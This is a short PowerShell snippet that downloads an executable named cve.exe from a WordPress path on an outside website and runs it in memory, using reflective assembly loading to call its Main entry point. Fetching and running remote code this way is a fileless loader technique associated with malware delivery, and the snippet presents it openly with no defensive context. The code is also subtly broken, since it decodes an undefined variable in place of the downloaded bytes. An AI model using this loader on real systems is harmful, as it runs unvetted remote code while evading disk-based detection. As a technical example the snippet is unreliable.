#downloading and executing in memory 

$bytes = (Invoke-WebRequest "https://budgetlc.com/wp-content/cve.exe" -UseBasicParsing ).Content
$bytes = [System.Convert]::FromBase64String($string)
$assembly = [System.Reflection.Assembly]::Load($bytes)

$entryPointMethod = 
 $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').
   GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')

# Now you can call the entry point.
# This example passes two arguments, 'foo' and 'bar'
$entryPointMethod.Invoke($null, (, [string[]] ('foo', 'bar')))